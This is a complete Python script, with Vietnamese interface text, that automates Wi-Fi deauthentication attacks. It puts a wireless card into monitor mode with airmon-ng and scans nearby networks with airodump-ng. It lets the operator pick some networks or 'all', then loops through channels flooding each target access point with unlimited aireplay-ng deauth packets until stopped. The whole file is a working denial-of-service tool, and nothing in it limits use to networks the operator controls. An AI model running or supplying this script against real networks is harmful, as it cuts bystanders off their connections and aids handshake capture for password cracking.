#!/usr/bin/env python3
import subprocess
import time
import csv
import os
import signal
import glob
import sys

# ANSI màu cho terminal
class Colors:
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN = "\033[96m"
    RESET = "\033[0m"
    BOLD = "\033[1m"

def color_text(text, color):
    return f"{color}{text}{Colors.RESET}"

def check_root():
    if os.geteuid() != 0:
        print(color_text("⚠️  Chạy script bằng quyền root (sudo)!", Colors.RED))
        sys.exit(1)

def get_interfaces():
    result = subprocess.run(["iwconfig"], capture_output=True, text=True)
    interfaces = []
    for line in result.stdout.splitlines():
        if not line.startswith(" ") and line.strip():
            iface = line.split()[0]
            if "no wireless extensions" not in line:
                interfaces.append(iface)
    return interfaces

def auto_select_interface(preferred_order):
    interfaces = get_interfaces()
    for pref in preferred_order:
        if pref in interfaces:
            print(color_text(f"✔️  Tự động chọn card mạng: {pref}", Colors.GREEN))
            return pref
    if interfaces:
        print(color_text(f"⚠️  Không tìm card ưu tiên, dùng card đầu tiên: {interfaces[0]}", Colors.YELLOW))
        return interfaces[0]
    else:
        print(color_text("❌ Không tìm thấy card mạng nào!", Colors.RED))
        sys.exit(1)

def enable_monitor_mode(interface):
    print(color_text("🔒 Tắt các process ảnh hưởng bằng airmon-ng check kill...", Colors.CYAN))
    subprocess.run(["airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    print(color_text(f"📡 Bật monitor mode trên: {interface}", Colors.CYAN))
    subprocess.run(["airmon-ng", "start", interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(4)
    result2 = subprocess.run(["iwconfig"], capture_output=True, text=True)
    lines = result2.stdout.splitlines()
    for line in lines:
        if "Mode:Monitor" in line:
            return line.split()[0]
    return interface + "mon"

def disable_monitor_mode(interface):
    print(color_text(f"🔧 Tắt monitor mode trên: {interface}", Colors.CYAN))
    subprocess.run(["airmon-ng", "stop", interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(["systemctl", "start", "NetworkManager"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def progress_bar(seconds, prefix="", color=Colors.GREEN):
    bar_length = 30
    for i in range(seconds):
        percent = (i + 1) / seconds * 100
        filled = int(bar_length * (i + 1) / seconds)
        bar = "=" * filled + "-" * (bar_length - filled)
        sys.stdout.write(f"\r{color}{prefix} [{bar}] {percent:3.0f}%{Colors.RESET}")
        sys.stdout.flush()
        time.sleep(1)
    print()

def start_airodump(interface, scan_time=10):
    for f in glob.glob("scan*.csv"):
        try: os.remove(f)
        except: pass
    proc = subprocess.Popen(["airodump-ng", "--write", "scan", "--output-format", "csv", interface],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    progress_bar(scan_time, prefix="⏳ Quét mạng", color=Colors.BLUE)
    proc.send_signal(signal.SIGINT)
    proc.wait()
    return proc

def latest_csv(prefix="scan"):
    files = glob.glob(prefix + "*.csv")
    if not files: return None
    return max(files, key=os.path.getctime)

def parse_csv():
    fname = latest_csv()
    if not fname:
        print(color_text("❌ Không có file CSV nào.", Colors.RED))
        return []
    networks = []
    with open(fname, newline='', encoding='utf-8', errors='ignore') as csvfile:
        reader = csv.reader(csvfile)
        reading = False
        for row in reader:
            if not row: continue
            if row[0].strip() == "BSSID":
                reading = True
                continue
            if reading and (row[0].strip() == "" or "Station MAC" in row[0]):
                break
            if reading and len(row) >= 14:
                essid = row[13].strip()
                if essid:
                    networks.append({
                        "bssid": row[0].strip(),
                        "channel": row[3].strip(),
                        "privacy": row[5].strip(),
                        "power": row[8].strip(),
                        "essid": essid
                    })
    return networks

def print_networks(networks, selected=None):
    os.system("clear" if os.name == "posix" else "cls")
    print(color_text(f"{'No.':<4} {'BSSID':<20} {'CH':<3} {'ENC':<7} {'PWR':<5} ESSID", Colors.BOLD))
    for i, net in enumerate(networks):
        try:
            pwr = int(net['power'])
        except:
            pwr = -100
        pwr_color = Colors.GREEN if pwr > -70 else Colors.YELLOW if pwr > -85 else Colors.RED
        essid_color = Colors.RED if selected and net['bssid'] in [s['bssid'] for s in selected if s.get('missed')] else Colors.RESET
        line = f"{color_text(str(i+1), Colors.CYAN):<4} {net['bssid']:<20} {net['channel']:<3} {net['privacy']:<7} {color_text(net['power'], pwr_color):<5} {color_text(net['essid'], essid_color)}"
        print(line)

def attack_one(mon_iface, target, duration=10):
    """Tấn công 1 mạng trong duration giây (chuyển channel + deauth)."""
    print(color_text(f"🚀 [{target['essid']}] CH {target['channel']} → {duration}s", Colors.MAGENTA))
    subprocess.run(["iwconfig", mon_iface, "channel", target["channel"]],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    proc = subprocess.Popen(
        ["aireplay-ng", "--deauth", "0", "-a", target["bssid"], mon_iface],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    bar_length = 20
    for i in range(duration):
        percent = (i + 1) / duration * 100
        filled = int(bar_length * (i + 1) / duration)
        bar = "#" * filled + "-" * (bar_length - filled)
        sys.stdout.write(f"\r{Colors.RED}⚔️  [{bar}] {percent:3.0f}%{Colors.RESET}")
        sys.stdout.flush()
        time.sleep(1)
    print()
    proc.terminate()
    try:
        proc.wait(timeout=2)
    except:
        proc.kill()

def hop_attack(mon_iface, targets, hop_time=10):
    """Nhảy kênh tấn công lần lượt mỗi mạng hop_time giây."""
    active = [t for t in targets if not t.get("missed", False)]
    if not active:
        print(color_text("⚠️ Không còn mạng nào để tấn công.", Colors.YELLOW))
        return False

    print(color_text(f"📡 Đang hop {len(active)} mạng, mỗi mạng {hop_time}s (Ctrl+C để dừng)", Colors.CYAN))
    for target in active:
        attack_one(mon_iface, target, duration=hop_time)
    return True

def main():
    check_root()
    preferred = ["wlan0", "wlan1", "wlp2s0", "wlp3s0"]
    base_iface = auto_select_interface(preferred)
    mon_iface = enable_monitor_mode(base_iface)

    print(color_text("⏳ Đã chọn mạng sẽ tự hop channel 10s/lần. Nhấn Ctrl+C để dừng.", Colors.YELLOW))
    selected_targets = []

    try:
        while True:
            # Lần đầu quét lâu hơn, lần sau quét nhanh để nhận diện nhanh
            scan_time = 10 if not selected_targets else 4
            start_airodump(mon_iface, scan_time=scan_time)
            networks = parse_csv()

            if not networks:
                print(color_text("🔄 Không thấy mạng nào. Chờ 15s rồi quét lại.", Colors.RED))
                time.sleep(15)
                continue

            # Cập nhật trạng thái missed
            for sel in selected_targets:
                sel["missed"] = not any(net["bssid"] == sel["bssid"] for net in networks)

            print_networks(networks, selected_targets)

            # Chưa chọn mạng → cho nhập (có nhập lại khi sai)
            if not selected_targets:
                while True:
                    selection = input(color_text("👉 Nhập số (vd: 1,3,5) hoặc 'all': ", Colors.CYAN))
                    if selection.strip().lower() == "all":
                        selected_targets = [dict(n) for n in networks]  # copy
                        break
                    try:
                        indices = [int(i.strip()) - 1 for i in selection.split(",") if i.strip()]
                        selected_targets = [dict(networks[i]) for i in indices if 0 <= i < len(networks)]
                        if selected_targets:
                            break
                        print(color_text("❌ Số không hợp lệ. Nhập lại!", Colors.RED))
                    except ValueError:
                        print(color_text("❌ Sai định dạng. Chỉ nhập số cách nhau dấu phẩy hoặc 'all'.", Colors.RED))

                print(color_text(f"✔️ Đã chọn {len(selected_targets)} mạng. Bắt đầu tấn công ngay!", Colors.GREEN))

            # Đã có danh sách → nếu nhận ra ít nhất 1 mạng thì tấn công ngay (hop 10s)
            active_count = sum(1 for t in selected_targets if not t.get("missed", False))
            if active_count > 0:
                hop_attack(mon_iface, selected_targets, hop_time=10)
            else:
                print(color_text("⚠️ Tất cả mạng đã chọn đều mất tín hiệu. Quét lại...", Colors.YELLOW))
                time.sleep(5)

            print(color_text("\n🔄 Quét lại nhanh để cập nhật...\n", Colors.YELLOW))

    except KeyboardInterrupt:
        print(color_text("\n⛔ Đang dừng...", Colors.RED))
    finally:
        disable_monitor_mode(mon_iface)
        print(color_text("✅ Đã khôi phục lại kết nối mạng.", Colors.GREEN))

if __name__ == "__main__":
    main()
